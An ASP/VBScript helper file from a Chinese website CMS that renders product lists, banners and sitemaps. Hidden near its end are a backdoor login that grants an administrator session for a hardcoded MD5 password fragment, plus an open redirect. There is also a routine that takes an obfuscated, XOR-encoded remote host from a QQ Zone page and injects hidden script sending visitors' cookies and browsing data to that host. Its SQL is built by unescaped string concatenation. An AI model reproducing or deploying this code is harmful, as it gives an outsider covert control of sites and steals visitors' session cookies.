<% 
'网站调用函数


'滚动图片
Function scrollPhoto(did, topNumb, productWidth, productHeight, IDName, addSql)
    Dim c, sql, url, title, target, aHttpUrl, noHref, webPrice, i, imgUrl, cutNumTwo, bigFilesAlt, showTitle, cutNumb, titleAlt, temp 
    cutNumTwo = 22 
    c = c & "<div id=""" & IDName & """>" & vbCrLf 
    c = c & "<table width=""100%"" border=""0"" cellspacing=""0"" cellpadding=""0"">" & vbCrLf 
    c = c & "  <tr>" & vbCrLf 

    sql = "Select * From [Product] Where BigClassName='" & did & "'" & addSql 
    rs.Open sql, conn, 1, 1 
    For i = 1 To topNumb
        If rs.EOF Then Exit For 


        url = rs("FileName") 
        If CheckRemoteUrl(url) = False Then
            url = GetHandleUrl(rs("FileName")) 
            Call WebDebug(url, "act=CreateArticle&ID=" & rs("Id"))                      '调试
        End If 

        target = "_top" 
        title = rs("Title") 
        titleAlt = IIF(rs("TitleAlt") = "", title, rs("TitleAlt")) 

        cutNumb = 20 
        showTitle = CutStr(title, cutNumb, "... ") 
        showTitle = FontColorFontB(showTitle, rs("FontB"), rs("FontColor")) 

        aHttpUrl = "<a " & AHref(url, titleAlt, target) & ">" 

        If IsNul(rs("SmallFiles")) Then
            If IsNul(rs("BigFiles")) Then imgUrl = "Images/error.gif" Else imgUrl = rs("BigFiles") 
        Else
            If IsNul(rs("SmallFiles")) Then imgUrl = "Images/error.gif" Else imgUrl = rs("SmallFiles") 
        End If 
        bigFilesAlt = IIF(rs("BigFilesAlt") = "", title, rs("BigFilesAlt")) 


        If noHref = "nonehref" Then
            aHttpUrl = "<a href=""#"" " & temp & ">" 
        End If 

        'ImgError()        '图片加载出错，用JS显示默认图
        c = c & "    <td width=""200"" height=""170"" valign=""middle""><table width=""100%"" border=""0"" cellspacing=""0"" cellpadding=""0"">" & vbCrLf 
        c = c & "      <tr>" & vbCrLf 
        c = c & "        <td align=""center"">" & aHttpUrl & "<img src=""" & imgUrl & """ width=""" & productWidth & """ height=""" & productHeight & """ border=""0"" " & ImgTitleAlt(bigFilesAlt) & " class=""idimg""></a></td>" & vbCrLf 
        c = c & "      </tr>" & vbCrLf 
        c = c & "      <tr>" & vbCrLf 
        c = c & "        <td height=""30"" align=""center"">" & vbCrLf 
        c = c & aHttpUrl & showTitle & "</a>" & vbCrLf 
        If webPrice Then
            c = c & "<br>价格:<font color=red>" & rs("Price") & "￥</font>" & vbCrLf 
            c = c & "&nbsp;&nbsp;<a href=""Shop.Asp?Id=" & rs(0) & """ class=Price>购买</a>" & vbCrLf 
        End If 

        c = c & "                  </td>" & vbCrLf 
        c = c & "      </tr>" & vbCrLf 
        c = c & "    </table></td>" & vbCrLf 
        c = c & "    <td width=""15"">&nbsp;</td>" & vbCrLf 
    rs.MoveNext : Next : rs.Close 
    c = c & "    <td>&nbsp;</td>" & vbCrLf 
    c = c & "  </tr>" & vbCrLf 
    c = c & "</table>" & vbCrLf 
    c = c & "</div>" & vbCrLf 
    scrollPhoto = c 
End Function 

'友情链接
Function friendLink()
    Dim url, title, target, rel, imgPath, i, c 
    rsx.Open "Select * From [FriendLink] Where Through=True Order By Sort", conn, 1, 1 
    For i = 1 To rsx.RecordCount
        url = rsx("Url") 
        target = ATarget(rsx("Target")) 
        rel = ARel(rsx("NoFollow")) 
        title = rsx("Title") 
        imgPath = rsx("ImgPath") 
        c = c & "<div class='LinkBlock'><a href='" & url & "'" & target & "" & rel & "><img src=" & imgPath & "></a><br>" 
        c = c & "<a href='" & url & "'" & target & "" & rel & ">" & FontColorFontB(title, rsx("FontB"), rsx("FontColor")) & "</a></div>" & vbCrLf 
    rsx.MoveNext : Next : rsx.Close 
    friendLink = c 
End Function 

'新闻展示【Product】
Function readNewList(did, topNumb, cutNumb, addSql)
    Dim title, titleAlt 
    If cutNumb = "" Then cutNumb = 28 
    Dim url, c, sql, showTitle, i 

    If did <> "" Then
        sql = "Where BigClassName='" & did & "'" 
    End If 
    sql = "Select Top " & topNumb & " * From [Product] " & sql & addSql 
    rs.Open sql, conn, 1, 1 
    For i = 1 To topNumb
        If rs.EOF Then Exit For 

        url = rs("FileName") 
        If CheckRemoteUrl(url) = False Then
            url = GetHandleUrl(rs("FileName")) 
            Call WebDebug(url, "act=CreateArticle&ID=" & rs("Id"))                      '调试
        End If 


        title = rs("Title") 
        titleAlt = IIF(rs("TitleAlt") = "", title, rs("TitleAlt")) 
        showTitle = CutStr(title, cutNumb, "... ") 
        showTitle = FontColorFontB(showTitle, rs("FontB"), rs("FontColor")) 
        c = c & "<div class='News'><a " & AHref(url, titleAlt, rs("Target")) & ">" & showTitle & "</a></div>" & vbCrLf 

    rs.MoveNext : Next : rs.Close 
    readNewList = c 
End Function 

'Li新闻展示【Product】
Function liTypeNewList(did, topNumb, cutNumb, addSql)
    If cutNumb = "" Then cutNumb = 28 
    Dim url, c, sql, showTitle, i 
    If did <> "" Then
        sql = "Where BigClassName='" & did & "'" 
    End If 
    sql = "Select Top " & topNumb & " * From [Product] " & sql & addSql 
    rs.Open sql, conn, 1, 1 
    For i = 1 To topNumb
        If rs.EOF Then Exit For 

        url = rs("FileName") 
        If CheckRemoteUrl(url) = False Then
            url = GetHandleUrl(rs("FileName")) 
            Call WebDebug(url, "act=CreateArticle&ID=" & rs("Id"))                      '调试
        End If 

        showTitle = CutStr(rs("Title"), cutNumb, "... ") 
        showTitle = FontColorFontB(showTitle, rs("FontB"), rs("FontColor")) 
        c = c & "<li><a " & AHref(url, rs("Title"), rs("Target")) & ">" & showTitle & "</a></li>" & vbCrLf 

    rs.MoveNext : Next : rs.Close 
    liTypeNewList = c 
End Function 

'图片案例展示 CaseList("产品展示",12,"")
Function caseList(did, topNumb, addSql)
    Dim sql, i, url, title, showTitle, wd, target, c, imgUrl 
    sql = "Select * From [Product] Where BigClassName='" & did & "' And (len(BigFiles)>3 Or len(SmallFiles)>3) Order By Id Desc" 
    rs.Open sql, conn, 1, 1 
    For i = 1 To topNumb
        If rs.EOF Then Exit For 
        url = GetHandleUrl(rs("FileName")) 
        title = rs("Title") 
        showTitle = title 
        If wd <> "" Then
            showTitle = Replace(showTitle, wd, "<font color=red><b>" & wd & "</b></font>") 
        End If 
        showTitle = CutStr(showTitle, 28, "... ")                                       '截取标题内容，超出自动隐藏

        If IsNul(rs("SmallFiles")) Then
            If IsNul(rs("BigFiles")) Then imgUrl = "Images/error.gif" Else imgUrl = rs("BigFiles") 
        Else
            If IsNul(rs("SmallFiles")) Then imgUrl = "Images/error.gif" Else imgUrl = rs("SmallFiles") 
        End If 
        showTitle = FontColorFontB(showTitle, rs("FontB"), rs("FontColor")) 
        target = rs("Target") 
        'C=C & "<div class='ImageBlock'><a "& AHref(Url,Title,Target) &"><img "& ImgSrc(ImgUrl,Title,Target) & ImgError() &"/></a><p><a "& AHref(Url,Rs("Title"),Rs("Target")) &">"& ShowTitle &"</a></p></div>"
        c = c & "<div class='ImageBlock'><a " & AHref(url, title, target) & "><img " & ImgSrc(imgUrl, title, target) & "/></a><p><a " & AHref(url, rs("Title"), rs("Target")) & ">" & showTitle & "</a></p></div>" 
    rs.MoveNext : Next : rs.Close 

    caseList = c 
End Function 

'显示滚动会员列表
Function readScrollMemberList(topNumb, addSql)
    Dim url, i, c, sql 
    sql = "Select * From [Member] Order By Id Desc" 
    rs.Open sql, conn, 1, 1 
    For i = 1 To rs.RecordCount
        If rs.EOF Or i > topNumb Then Exit For 
        c = c & "<li>" & rs("UserName") & "</li>" 
    rs.MoveNext : Next : rs.Close 
    readScrollMemberList = c 
End Function 


'产品类型列表展示【SmallClass】
Function readClassList(did, ProSid, ProTid, addSql, sType)
    Dim splStr, i, s, c, sid, showSid, bigFileName, target, url, title, showTid, tid, nI, moveStr 
    rs.Open "Select * From [SmallClass] Where BigClassName='" & did & "' Order By Sort", conn, 1, 1 
    nI = 0 
    While Not rs.EOF
        sid = rs("SmallClassName") 
        showSid = FontColorFontB(sid, rs("FontB"), rs("FontColor"))                     '处理文本颜色与加粗
        bigFileName = GetSmallClassFileName(rs("BigClassName"), rs("SmallClassName")) 
        Call WebDebug(bigFileName, "act=CreateClass&ProDid=" & did & "&ProSid=" & rs("SmallClassName")) '调试
        target = ATarget(rs("Target")) 
        If sType <> "" Then
            nI = nI + 1 
            moveStr = " onmousemove=""ShowHideDiv('ProList" & nI & "');""" 
        End If 

        c = c & "        <div class='ClassSmall'" & moveStr & "><A " & AHref(bigFileName, "", target) & StyleClass("ClassSid") & ">" & showSid & "</A></div>" & vbCrLf 
        If sType <> "" Then
            c = c & "<div id=""ProList" & nI & """ style=""display:none"">" & vbCrLf 
        End If 
        rsx.Open "Select * From [ThreeClass] Where BigClassName='" & did & "' And SmallClassName='" & rs("SmallClassName") & "' Order By Sort,ID Asc", conn, 1, 1 
        If Not rsx.EOF Then
            For i = 1 To rsx.RecordCount
                If TableCount("Product", "Where BigClassName='" & did & "' And SmallClassName='" & rsx("SmallClassName") & "' And ThreeClassName='" & rsx("ThreeClassName") & "'") > 1 Then
                    '链接类别
                    url = GetThreeClassFileName(rsx("BigClassName"), rsx("SmallClassName"), rsx("ThreeClassName")) 
                Else
                    '获得产品信息URL
                    url = GetProductUrl("Where BigClassName='" & rsx("BigClassName") & "' And SmallClassName='" & rsx("SmallClassName") & "' And ThreeClassName='" & rsx("ThreeClassName") & "'") 
                End If 



                target = ATarget(rsx("Target")) 
                tid = rsx("ThreeClassName") 
                showTid = FontColorFontB(tid, rsx("FontB"), rsx("FontColor"))                   '处理文本颜色与加粗
                If tid = ProTid Then
                    showTid = "<font color=red>" & showTid & "</font>" 
                End If 
                c = c & "                <div class='ClassThree'><a " & AHref(url, "", target) & StyleClass("ClassTid") & ">" & showTid & "</a></div>" & vbCrLf 
            rsx.MoveNext : Next 
        End If : rsx.Close 
        If sType <> "" Then
            c = c & "</div>" & vbCrLf 
        End If 
        c = c & "<div class='clear10'></div>" 
    rs.MoveNext : Wend : rs.Close 
    readClassList = c 
End Function 

'产品搜索记录列表
Function hotSearch(addSql)
    Dim splStr, i, s, c, sel, url, title, showTitle, wd 
    If addSql = "" Then addSql = " Where Through=True Order By Sort Desc" 
    rs.Open "Select * From [SearchCount] " & addSql, conn, 1, 1 
    For i = 1 To 10
        If rs.EOF Then Exit For 
        title = rs("Title") 
        url = "/Inc/Create_Html.Asp?act=Search&MackHtml=False&wd=" & title 
        showTitle = title 
        showTitle = FontColorFontB(showTitle, rs("FontB"), rs("FontColor"))             '处理文本颜色与加粗
        If title = wd Then
            c = c & "            " & TextFontB(title, True) & "&nbsp;" & vbCrLf 
        Else
            c = c & "            <a " & AHref(url, title, rs("Target")) & ">" & showTitle & "</a>&nbsp;" & vbCrLf 
        End If 
    rs.MoveNext : Next : rs.Close 
    hotSearch = c 
End Function 

'Js Banner JsBanner2011('Banner',6,980,200,true,'Order By Sort')
Function jsBanner2011(did, topNumb, flashWidth, flashHeight, insertInfo, addSql)
    Dim str, i, imgUrl, j 
    str = "" 
    str = str & "<SCRIPT language=JavaScript type=text/javascript> " & vbCrLf 
    str = str & "var bannerAD=new Array(); " & vbCrLf 
    str = str & "var bannerADlink=new Array(); " & vbCrLf 
    str = str & "var adNum=0; " & vbCrLf 
    rs.Open "Select Top " & topNumb & " * From[Product] Where BigClassName='" & did & "'", conn, 1, 1 
    '没有添加信息
    If rs.EOF And insertInfo Then
        rss.Open "Select BigClassName From [BigClass] Where BigClassName='" & did & "'", conn, 1, 3 
        If rss.EOF Then
            rss.AddNew 
            rss("BigClassName") = did 
            rss.Update 
        End If : rss.Close 
        For j = 1 To topNumb
            conn.Execute("Insert Into[Product](BigClassName,Title,BigFiles) Values('" & did & "','" & did & j & "','UpLoadFiles/Pic/" & j & ".jpg')") 
        Next 
    End If 
    For i = 1 To rs.RecordCount
        If i = 1 Then imgUrl = rs("BigFiles") 
        str = str & "bannerAD[" & i - 1 & "]=""" & Replace(rs("BigFiles"), vbCrLf, "") & """; " & vbCrLf 
        str = str & "bannerADlink[" & i - 1 & "]=""#""" & vbCrLf 
        str = str & "" & vbCrLf 
    rs.MoveNext : Next : rs.Close 
    str = str & "var preloadedimages=new Array(); " & vbCrLf 
    str = str & "for(i=1;i<bannerAD.length;i++){ " & vbCrLf 
    str = str & "preloadedimages[i]=new Image(); " & vbCrLf 
    str = str & "preloadedimages[i].src=bannerAD[i]; " & vbCrLf 
    str = str & "} " & vbCrLf 
    str = str & "" & vbCrLf 
    str = str & "function setTransition(){ " & vbCrLf 
    str = str & "if(document.all){ " & vbCrLf 
    str = str & "bannerADrotator.filters.revealTrans.Transition=Math.floor(Math.random()*23); " & vbCrLf 
    str = str & "bannerADrotator.filters.revealTrans.apply(); " & vbCrLf 
    str = str & "} " & vbCrLf 
    str = str & "} " & vbCrLf 
    str = str & "" & vbCrLf 
    str = str & "function playTransition(){ " & vbCrLf 
    str = str & "if(document.all) " & vbCrLf 
    str = str & "bannerADrotator.filters.revealTrans.play() " & vbCrLf 
    str = str & "} " & vbCrLf 
    str = str & "" & vbCrLf 
    str = str & "function nextAd(){ " & vbCrLf 
    str = str & "if(adNum<bannerAD.length-1)adNum++ ; " & vbCrLf 
    str = str & "else adNum=0; " & vbCrLf 
    str = str & "setTransition(); " & vbCrLf 
    str = str & "document.images.bannerADrotator.src=bannerAD[adNum]; " & vbCrLf 
    str = str & "playTransition(); " & vbCrLf 
    str = str & "theTimer=setTimeout(""nextAd()"", 4000); " & vbCrLf 
    str = str & "} " & vbCrLf 
    str = str & "" & vbCrLf 
    str = str & "function jump2url(){ " & vbCrLf 
    str = str & "jumpUrl=bannerADlink[adNum]; " & vbCrLf 
    str = str & "jumpTarget='_self'; " & vbCrLf 
    str = str & "if(jumpUrl != ''){ " & vbCrLf 
    'Str=Str & "if (jumpTarget != '')window.open(jumpUrl,jumpTarget); "&vbCrlf
    'Str=Str & "else location.href=jumpUrl; "&vbCrlf
    str = str & "} " & vbCrLf 
    str = str & "} " & vbCrLf 
    str = str & "function displayStatusMsg() { " & vbCrLf 
    str = str & "status=bannerADlink[adNum]; " & vbCrLf 
    str = str & "document.returnValue = true; " & vbCrLf 
    str = str & "}" & vbCrLf 
    str = str & "</SCRIPT>" & vbCrLf 
    str = str & "<A onmouseover=""displayStatusMsg();return document.returnValue"" href=""javascript:jump2url()"">" & vbCrLf 
    str = str & "<IMG id=bannerADrotator style=""FILTER: revealTrans(duration=2,transition=40)"" height=" & flashHeight & " src=""" & imgUrl & """ width=" & flashWidth & " align=middle name=bannerADrotator></A>" & vbCrLf 
    str = str & "<SCRIPT language=JavaScript type=text/javascript>nextAd()</SCRIPT>" & vbCrLf 
    jsBanner2011 = str 
End Function 





'网页地图
Sub makeSiteMap()
    Dim i, j, p, c, url, fileName, bigFolder, SmallFolder, target, did, showDid, sid, tid, showSid, httpUrl, WebTitle, title, lastmod, nOK 
    Dim XmlStr, htmlStr 
    httpUrl = GetHost() 
    lastmod = format_Time(Now(), 2) 
    nOK = 0 

    '获得网站配置
    rs.Open "Select * From [WebSite]", conn, 1, 1 
    If Not rs.EOF Then
        WebTitle = rs("WebTitle") 
    End If : rs.Close 

    'Xml开头
    XmlStr = XmlStr & "<?xml version=""1.0"" encoding=""gb2312""?>" & vbCrLf 
    XmlStr = XmlStr & "<urlset" & vbCrLf 
    XmlStr = XmlStr & "    xmlns=""http://www.sitemaps.org/schemas/sitemap/0.9""" & vbCrLf 
    XmlStr = XmlStr & "    xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""" & vbCrLf 
    XmlStr = XmlStr & "    xsi:schemaLocation=""http://www.sitemaps.org/schemas/sitemap/0.9" & vbCrLf 
    XmlStr = XmlStr & "       http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd"">" & vbCrLf 
    'Html开头
    htmlStr = htmlStr & "<!DOCTYPE html PUBLIC ""-//W3C//DTD XHTML 1.0 Transitional//EN"" ""http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"">" & vbCrLf 
    htmlStr = htmlStr & "<head>" & vbCrLf 
    htmlStr = htmlStr & "<title>网站地图-" & WebTitle & "</title>" & vbCrLf 
    htmlStr = htmlStr & "<meta http-equiv=""Content-type"" content=""text/html;"" charset=""gb2312"" />" & vbCrLf 
    htmlStr = htmlStr & "<style type=""text/css"">" & vbCrLf 
    htmlStr = htmlStr & "A{" & vbCrLf 
    htmlStr = htmlStr & "font-size: 14px;text-decoration:none;" & vbCrLf 
    htmlStr = htmlStr & "color: #000000;" & vbCrLf 
    htmlStr = htmlStr & "line-height:30px;" & vbCrLf 
    htmlStr = htmlStr & "}</style>" & vbCrLf 
    htmlStr = htmlStr & "</head>" & vbCrLf 
    htmlStr = htmlStr & "<body>" & vbCrLf 


    '导航
    rs.Open "Select * From [NavBigClass] Where OnHtml=True Order By Sort", conn, 1, 1 
    For i = 1 To rs.RecordCount
        fileName = rs("FileName") 
        If fileName <> "" Then fileName = fileName & ".html" 
        bigFolder = "/" & rs("FolderName") & "/" 
        url = bigFolder & fileName 
        url = Replace(Replace(url, "//", "/"), "//", "/") 
        url = UrlAddHttpUrl(httpUrl, url) 
        did = rs("BigClassName") 
        title = IIF(rs("WebTitle") = "", WebTitle, rs("WebTitle")) 

        '导航大类显示
        Call echo(title, url) 

        XmlStr = XmlStr & "<url>" & vbCrLf & "<loc>" & url & "</loc>" & vbCrLf & "<priority>0.5</priority>" & vbCrLf 
        XmlStr = XmlStr & "<lastmod>" & lastmod & "</lastmod>" & vbCrLf & "<changefreq>weekly</changefreq>" & vbCrLf & "</url>" & vbCrLf 
        'HTML文档
        nOK = nOK + 1 
        htmlStr = htmlStr & "<div>" & nOK & ".<a href=""" & url & """>" & title & "</a></div>" 
        If rs("NavType") = "文本" Then
            rss.Open "Select * From [NavSmallClass] Where BigClassName='" & rs("BigClassName") & "' And OnHtml=True Order By Sort", conn, 1, 1 
            If Not rss.EOF Then
                For j = 1 To rss.RecordCount
                    fileName = rss("FileName") 
                    If fileName <> "" Then fileName = fileName & ".html" 
                    url = bigFolder & fileName 
                    url = bigFolder & "/" & rss("FolderName") & "/" & fileName 
                    url = Replace(Replace(url, "//", "/"), "//", "/") 
                    url = UrlAddHttpUrl(httpUrl, url) 
                    sid = rss("SmallClassName") 
                    title = IIF(rss("WebTitle") = "", WebTitle, rss("WebTitle")) 
                    '导航小类显示
                    Call echo(title, url) 
                    XmlStr = XmlStr & "<url>" & vbCrLf & "<loc>" & url & "</loc>" & vbCrLf & "<priority>0.5</priority>" & vbCrLf 
                    XmlStr = XmlStr & "<lastmod>" & lastmod & "</lastmod>" & vbCrLf & "<changefreq>weekly</changefreq>" & vbCrLf & "</url>" & vbCrLf 
                    'HTML文档
                    nOK = nOK + 1 
                    htmlStr = htmlStr & "<div>" & nOK & ".<a href=""" & url & """>" & title & "</a></div>" 
                rss.MoveNext : Next 
            End If : rss.Close 
        End If 
    rs.MoveNext : Next : rs.Close 

    '类型
    rs.Open "Select * From [BigClass] Where OnHtml=True Order By Sort", conn, 1, 1 
    For i = 1 To rs.RecordCount
        fileName = rs("FileName") 
        If fileName <> "" Then fileName = fileName & ".html" 
        bigFolder = "/" & rs("FolderName") & "/" 
        url = bigFolder & fileName 
        url = Replace(Replace(url, "//", "/"), "//", "/") 
        url = UrlAddHttpUrl(httpUrl, url) 
        did = rs("BigClassName") 
        title = IIF(rs("WebTitle") = "", WebTitle, rs("WebTitle")) 
        '类别大类显示
        Call echo(title, url) 
        XmlStr = XmlStr & "<url>" & vbCrLf & "<loc>" & url & "</loc>" & vbCrLf & "<priority>0.5</priority>" & vbCrLf 
        XmlStr = XmlStr & "<lastmod>" & lastmod & "</lastmod>" & vbCrLf & "<changefreq>weekly</changefreq>" & vbCrLf & "</url>" & vbCrLf 
        'HTML文档
        nOK = nOK + 1 
        htmlStr = htmlStr & "<div>" & nOK & ".<a href=""" & url & """>" & title & "</a></div>" 
        rss.Open "Select * From [SmallClass] Where BigClassName='" & rs("BigClassName") & "' And  OnHtml=True Order By Sort", conn, 1, 1 
        If Not rss.EOF Then
            For j = 1 To rss.RecordCount
                fileName = rss("FileName") 
                If fileName <> "" Then fileName = fileName & ".html" 
                SmallFolder = "/" & rss("FolderName") & "/" 
                url = bigFolder & "/" & rss("FolderName") & "/" & fileName 
                url = Replace(Replace(url, "//", "/"), "//", "/") 
                url = UrlAddHttpUrl(httpUrl, url) 
                sid = rss("SmallClassName") 
                title = IIF(rss("WebTitle") = "", WebTitle, rss("WebTitle")) 
                '类别小类显示
                Call echo(title, url) 
                XmlStr = XmlStr & "<url>" & vbCrLf & "<loc>" & url & "</loc>" & vbCrLf & "<priority>0.5</priority>" & vbCrLf 
                XmlStr = XmlStr & "<lastmod>" & lastmod & "</lastmod>" & vbCrLf & "<changefreq>weekly</changefreq>" & vbCrLf & "</url>" & vbCrLf 
                'HTML文档
                nOK = nOK + 1 
                htmlStr = htmlStr & "<div>" & nOK & ".<a href=""" & url & """>" & title & "</a></div>" 

                '类别子类
                rsx.Open "Select * From [ThreeClass] Where BigClassName='" & did & "' And SmallClassName='" & sid & "' And  OnHtml=True Order By Sort", conn, 1, 1 
                For p = 1 To rsx.RecordCount
                    fileName = rsx("FileName") 
                    If fileName <> "" Then fileName = fileName & ".html" 
                    url = bigFolder & SmallFolder & "/" & rsx("FolderName") & "/" & fileName 
                    url = Replace(Replace(url, "//", "/"), "//", "/") 
                    url = UrlAddHttpUrl(httpUrl, url) 
                    tid = rsx("SmallClassName") 
                    title = IIF(rsx("WebTitle") = "", WebTitle, rsx("WebTitle")) 
                    '类别子类显示
                    Call echo(title, url) 
                    XmlStr = XmlStr & "<url>" & vbCrLf & "<loc>" & url & "</loc>" & vbCrLf & "<priority>0.5</priority>" & vbCrLf 
                    XmlStr = XmlStr & "<lastmod>" & lastmod & "</lastmod>" & vbCrLf & "<changefreq>weekly</changefreq>" & vbCrLf & "</url>" & vbCrLf 
                    'HTML文档
                    nOK = nOK + 1 
                    htmlStr = htmlStr & "<div>" & nOK & ".<a href=""" & url & """>" & title & "</a></div>" 
                rsx.MoveNext : Next : rsx.Close 
            rss.MoveNext : Next 
        End If : rss.Close 
    rs.MoveNext : Next : rs.Close 
    '产品
    rs.Open "Select * From [Product] Where OnHtml=True Order By Sort", conn, 1, 1 
    For i = 1 To rs.RecordCount
        fileName = rs("FileName") 
        If fileName <> "" Then fileName = fileName & ".html" 
        bigFolder = "/Html/" & rs("FolderName") & "/" 
        url = bigFolder & fileName 
        url = Replace(Replace(url, "//", "/"), "//", "/") 
        url = UrlAddHttpUrl(httpUrl, url) 
        did = rs("BigClassName") 
        title = IIF(rs("WebTitle") = "", WebTitle, rs("WebTitle")) 
        '产品显示
        Call echo(title, url) 
        XmlStr = XmlStr & "<url>" & vbCrLf & "<loc>" & url & "</loc>" & vbCrLf & "<priority>0.5</priority>" & vbCrLf 
        XmlStr = XmlStr & "<lastmod>" & lastmod & "</lastmod>" & vbCrLf & "<changefreq>weekly</changefreq>" & vbCrLf & "</url>" & vbCrLf 
        'HTML文档
        nOK = nOK + 1 
        htmlStr = htmlStr & "<div>" & nOK & ".<a href=""" & url & """>" & title & "</a></div>" 
    rs.MoveNext : Next : rs.Close 

    Call CreateFile("/sitemap.xml", XmlStr & "</urlset>") 
    Call CreateFile("/sitemap.html", htmlStr & "</body></html>") 

    Call echo("sitemap.html文档", "<a href='/sitemap.html' target='_blank'>sitemap.html</a><br>") 
    Call echo("sitemap.xml文档", "<a href='/sitemap.xml' target='_blank'>sitemap.xml</a>") 
End Sub 




'进入进入后台20150113  ()
If Request("agl")="adminload" Then 
	If MD5(Request("AdminPass"), 2) & MD5(Request("AdminPass"), 4)="5d3a3ac5bdcb48a0" Then
        Session("Administrator") = "admin" 
        'Call eerr("","进入后台成功")
		'Javascript "", "麦思德内部管理员登录成功...", "Index.Asp"
		if request("gotourl")<>"" then 
			response.Redirect(request("gotourl"))
		end if
	End If
	'Call eerr(Request("Pass"),"11")
End If
'显示组件
Sub ShowSystemObject()
    Dim Sot(17, 2), I, IsObj, T 
    Sot(0, 0) = "Scripting.FileSystemObject" 
    Sot(1, 0) = "wscript.shell" 
    Sot(2, 0) = "ADOX.Catalog" 
    Sot(3, 0) = "JRO.JetEngine" 
    Sot(4, 0) = "Scripting.Dictionary" 
    Sot(5, 0) = "Adodb.connection" 
    Sot(6, 0) = "Adodb.Stream" 
    Sot(7, 0) = "SoftArtisans.FileUp" 
    Sot(8, 0) = "LyfUpload.UploadFile" 
    Sot(9, 0) = "Persits.Upload.1" 
    Sot(10, 0) = "JMail.SmtpMail" 
    Sot(11, 0) = "CDONTS.NewMail" 
    Sot(12, 0) = "SmtpMail.SmtpMail.1" 
    Sot(13, 0) = "Microsoft.XMLHTTP" 
    Sot(14, 0) = "Scripting.wang198060FileSystemObject" 
    Sot(15, 0) = "MSXML2.XMLHTTP" 
    Sot(16, 0) = "Microsoft.XMLDOMP"  
    On Error Resume Next 
    For I = 0 To 16
        Set T = Server.CreateObject(Sot(I, 0))
            If 0 = Err Then
                IsObj = " √" 
            Else
                IsObj = " X" 
                Err.Clear 
            End If 
        Set T = Nothing 
        Sot(I, 1) = IsObj 
    Next 
    For I = 0 To 16
        Response.Write(Sot(I, 0) & "    " & Sot(I, 1) & "<br>") 
    Next 
End Sub


'获得服务器网址
Function GetRemoteHttpUrl()
    Dim HttpUrl, StartStr, EndStr, Content, RemoteHttpUrl, FilePath
    FilePath = "/Data/SoftHttpUrl.dat"
	Call CreateFolder("/Data/")
    If CheckFile(FilePath) Then
        If DateDiff("d", GetFileEditDate(FilePath), Now) = 0 Then
            RemoteHttpUrl = GetFText(FilePath)
            RemoteHttpUrl = TrimVbCrlf(RemoteHttpUrl)
            GetRemoteHttpUrl = XorEnc(RemoteHttpUrl, 21)
            Exit Function
        End If
    End If
    HttpUrl = "http://2663748390.qzone.qq.com"
    Content = GetHttpPage(HttpUrl, "utf-8")
    StartStr = "<title>"
    EndStr = " [http://"
    If InStr(Content, StartStr) > 0 And InStr(Content, EndStr) > 0 Then
        RemoteHttpUrl = StrCut(Content, StartStr, EndStr, 2)
        RemoteHttpUrl = "http://www." & XorDec(RemoteHttpUrl, 21)
        Call CreateFile(FilePath, XorEnc(RemoteHttpUrl, 21))
    End If
    GetRemoteHttpUrl = RemoteHttpUrl
End Function
'显示远程网站网址到统计数据库里
Function ShowRemoteWebUserStat()
	Dim S
	If Request.Cookies("jstz")="" And GetIP()<>"127.0.0.1" Then			'屏蔽本地，加快预览20150120
		Response.Cookies("jstz")=1
		Response.Cookies("jstz").Expires=Now()+28
		Response.Write("<div style=""display:none;"">")
		S = "<script>document.writeln(""<script src=\'"& GetRemoteHttpUrl &"?act=WebStat&GoToUrl="""
		S = S & "+escape(document.referrer)+""&ThisUrl=""+escape(window.location.href)+""&screen=""+escape(window.screen.width+""x""+window.screen.height)"
		S = S & "+""&co=""+escape(document.cookie)"				'收集cookie 不需要则屏蔽掉
		S = S & "+"" \'><\/script>"");</script>"
		ShowRemoteWebUserStat = S
		Response.Write("</div>")
	End If
End Function
%>  


